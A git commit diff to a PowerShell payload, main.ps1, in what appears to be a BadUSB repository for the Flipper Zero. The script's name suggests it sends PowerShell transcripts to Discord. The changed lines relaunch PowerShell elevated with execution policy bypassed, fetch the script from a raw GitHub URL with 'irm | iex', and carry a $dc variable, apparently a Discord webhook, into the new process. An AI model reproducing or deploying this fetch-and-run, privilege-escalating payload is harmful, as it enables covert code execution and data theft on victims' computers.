0f2b48885c881092f052dca32f20700e342d0fc0
egieb <93350544+beigeworm@users.noreply.github.com>
2024-04-03 19:39:35 +0000

    Update main.ps1

--- Global-PS-Trascription-to-Discord/main.ps1
+++ Global-PS-Trascription-to-Discord/main.ps1
@@ -29,7 +29,7 @@ Function RestartScript{
         Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
     }
     else{
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$dc = $dc; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
     }
     exit
 }
